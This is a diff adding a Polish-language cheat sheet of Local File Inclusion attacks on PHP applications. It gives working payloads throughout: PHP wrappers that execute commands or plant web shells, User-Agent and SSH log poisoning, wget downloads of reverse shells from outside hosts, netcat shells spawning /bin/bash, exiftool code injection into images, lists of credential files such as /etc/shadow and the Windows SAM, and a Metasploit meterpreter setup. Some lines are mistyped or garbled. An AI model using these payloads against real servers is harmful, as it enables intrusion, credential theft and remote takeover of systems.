@@ -1,0 +1,245 @@
+//Created by Krzysztof Gajewski https://www.linkedin.com/in/krzysztof-gajewski-537683b9/ //
+
+Local File Inclusion
+Atak ten polega na możliwości odczytywania plików dowolnie pod zdalnie z atakowane systemu.
+
+W środowisku PHP atak zazwyczaj polega na:
+•	zatruwaniu plików z logami,
+•	wstrzykiwaniu złośliwego kodu w „user agnet header”,
+•	bądź wykorzystania pliku “/proc/self/environ”.
+
+W sytuacji kiedy mamy do czynienia ze środowiskiem PHP możemy użyć wbudowanych „PHP wrappers”, aby ułatwić nasz cel bądź też ominąć istniejące filtry. Najpopularniejsze metody:
+•	expect://
+•	php://input
+•	php://filter
+•	data://”
+•	php://zip
+
+Warto zawsze sprawdzić plik phpinfo.php w celu sprawdzenia dwóch parametrów.
+- allow_url_fopen = on - pozwala na traktowanie URL  (http:// albo ftp://) jako pliki.
+- allow_url_include = on - pozwala na include/require URL  (http:// albo ftp://) jako pliki.
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+1.	PHP expect:// wrapper pozwala na wykonywanie komend systemowych, jest wyłączony domyślnie. 
+Przykład użycia:
+http://127.0.0.1/fileincl/example1.php?page=expect://ls
+
+W przypadku gdy ten wrapper jest wyłączony zobaczymy następujący błąd:
+Warning: include(): Unable to find the wrapper "expect" ….
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+2.	PHP php://input wrapper (allow_url_include=On)
+Pozwala na przekierowanie danych przesłanych metodą post jako argument  i dzięki funkcji Include możemy załączyć przesłane dane i je wykonać.
+
+- Burp Suite,
+- Hack Bar dodatek do firefox,
+- http://192.168.183.128/fileincl/example1.php?page=php://input
+- <? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>
+
+- Curl 
+- curl http://xxx.xxx.index.php?view=php://input –d “ <?php system(‘id’); ?>” 
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+3.	PHP php://filter wrapper 
+Pozwala na załączenie lokalnych plików i wyświetlanie ich w zakodowanym formacie base64.
+Przykład użycia:
+
+vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+4.	PHP data:text/plain wrapper (allow_url_include=On)
+Pozwala na załączenie kodu PHP przez stream data.
+
+Przykład użycia:
+
+http://www.site.com/lfi.php?page=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>
+http://www.site.com/lfi.php?page=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7Pz4=
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+5.	PHP zip:// wrapper
+ZIP wrapper pozwala na procesowanie uplodowanych zip po stronie serwera. Więc możemy wrzucić plik .zip i uruchomić przy pomocy wrapera. 
+•	- Przygotuj PHP erverse shell
+•	- Skompresuj do pliku .zip
+•	- Wgraj na serwer
+•	- Użyj wrappera do wypakowania pliku uzywajac:
+php?page=zip://path/to/file.zip%23shell
+•	- Jeżeli serwer nie dodaj .php zmien nazwe recznie
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+6.	/proc/self/environ LFI
+Jeśli istnieje możliwość załączenia pliku proc/self/environ na maszynie która atakujemy, to dzięki manipulacją polem w nagłówku Header „User Agent” może wstrzyknąć złośliwy kod.  
+Do tego zadania możemy użyć Tamper Data dodatek do Firefox i zmienić wartość w polu  User-Agent. 
+•	www.website.com/view.php?page=../../../../../proc/self/environ
+•	<?system('wget http://192.168.43.159/download/c99.txt -O shell.php');?>
+•	www.website.com/shell.php
+Shell wrzucamy do katalogu /tmp/ jeśli są problemy z uprawnieniami.
+Innymi przykładem może być nawiązanie sesji przy użyciu ncat:
+<?system('nc -lvp 1221 -e /bin/bash ');?>
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+7.	/proc/self/fd/ LFI
+Jeśli istnieje możliwość załączenia pliku proc/self/fd na maszynie która atakujemy, to dzięki manipulacją polem w nagłówku Header „REFERER” może wstrzyknąć złośliwy kod.
+Ta metoda jest o tyle trudna, że plik /proc/self/fd/ zawierający błędy Apache zmienia swoje lokalizacje 
+- /proc/self/fd
+- /proc/self/fd2
+
+Dlatego warto najpierw przeprowadzić atak typu brute force przy użyciu Burp Intruder i biorąc pod uwagę rozmiar plików odkryć, który plik jest poprawny. 
+
+Pliczek zawierający nazwy plików:
+https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+8.	LFI Image PHP code
+Używajac narzedzie exiftool, możemy dodać kod w PHP do metadanych obrazka który pozwoli na wykonanie poleceń systemowych po stronie serwera. 
+Następnie wykorzystując lukę LFI inkludujemy obrazek. 
+exiftool -Comment="<?php passthru(\$_GET'cmd'); _halt_compiler();" /root/picture.jpeg
+The \$_GET'cmd'); code is what reads our command, and the _halt_compiler();prevents the file-checking system from reading on with the binary data.
+Nasz plik nazway np. picture.php.jpeg
+https://null-byte.wonderhowto.com/how-to/upload-shell-web-server-and-get-root-rfi-part-1-0162818/
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+9.	SSH Log Poisoning
+Jeżeli istnieje możliwość załączenia pliku /var/log/auth.log możemy spróbować połączyć zainicjować połączenie SSH jak podano poniżej:
+ssh '<?php echo system($_GET["cmd"]); exit; ?>'@[HOST]
+A następnie spróbować załączyć plik /var/log/auth.log&cmd= nc IP:PORT –e /bin/bash
+W tym samym czasie musimy ustawić nc w trybie nasłuchu.
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+10. FIMAP
+Fimap wykorzystuje tymczasowe tworzenie plików PHP poprzez lokalne włączanie plików i nadużywanie informacji ujawnienich wi PHPinfo ().
+Jeśli plik phpinfo () jest obecny, zazwyczaj można uzyskać powłokę, jeśli nie znasz lokalizacji pliku phpinfo, to fimap może sondować, lub można użyć narzędzia takiego jak OWASP DirBuster.
+10.	Przykładowy kod w PHP do ładowania plików na stronie:
+
+<?php
+ $file = $_GET['file'];
+ if(isset($file))
+    {
+      include("pages/$file");
+    }
+ else
+    {
+      include("index.php");
+    }
+?>
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+11.	Truncation LFI Bypass
+- http://$ip/index.php?page=/etc/passwd
+- http://$ip/index.php?file=../../../../etc/passwd
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+12.	Metody załączania plików zewnętrznych w PHP:
+
+-include - załącza coś do pliku w miejscu wystąpienia składniki include, w razie wystąpienia błędu bądź braku pliku jest to traktowane jako warning i kod jest wykonywalny dalej.
+- include_once - załącza coś do pliku w miejscu wystąpienia. W razie próby ponownego załączenia tych samych danych dyrektywa ta zostanie zignorowana w razie wystąpienia błędu bądź braku pliku jest to traktowane jako warning i kod jest wykonywalny dalej.
+- require - załącza coś do pliku w miejscu wystąpienia. Jako że dane są wymagane (required) w razie wystąpienia błędu jest to traktowane jako fatal error.
+- require_once - załącza coś do pliku w miejscu wystąpienia. W razie próby ponownego załączenia tych samych danych dyrektywa ta zostanie zignorowana. Jako że dane są wymagane (required) w razie wystąpienia błędu jest to traktowane jako fatal error.
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+13.	 Null Byte Technique
+Wstrzykiwanie NULL BYTE pozwala na ominiecie filtrów WEB aplikacji poprzez dodawanie zakodowanie pustego znaku jako %00. Jest to bardzo sposób na ominięcie fitrów typu filename + „php”. Pusty znak zapewnia nam pominięcie fragmentów kodu po nim występującego.
+ 
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+14.	Przydatne pliki Linux File Locations
+– /etc/issue
+– /etc/profile
+– /etc/passwd
+– /etc/shadow
+– /proc/version
+- /proc/self/environ
+– /root/.bash_history
+– /var/log/dmessage
+– /var/mail/root
+– /var/spool/cron/crontabs/root
+-  /var/log/mail/USER
+- /var/log/apache2/access.log
+- /tmp/sess_ID and /var/lib/php5/sess_ID
+- Uploaded file path. (if you don’t know it checks at /tmp and the default upload paths of every server and CMS). phpinfo() will also help for such information.
+- /var/log/auth.log
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+15.	Windows File Locations
+– %SYSTEMROOT%\repair\system
+– %SYSTEMROOT%\repair\SAM
+– %SYSTEMROOT%\repair\SAM
+– %WINDIR%\win.ini
+– %SYSTEMDRIVE%\boot.ini
+– %WINDIR%\Panther\sysprep.inf
+– %WINDIR%\system32\config\AppEvent.Evt
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+16.	OS X/macOS File Locations:
+– /etc/fstab
+– /etc/master.passwd
+– /etc/resolv.conf
+– /etc/sudoers
+– /etc/sysctl.conf
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+17.	LFI useful files for Brute-Force
+https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+18.	 Metasploit for LFI
+http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/
+
+use exploit/multi/script/web_delivery
+msf exploit (web_delivery)>set target 1
+msf exploit (web_delivery)> set payload php/meterpreter/reverse_tcp
+msf exploit (web_delivery)> set lhost 192.168.1.123
+msf exploit (web_delivery)>set srvport  8081
+msf exploit (web_delivery)>exploit
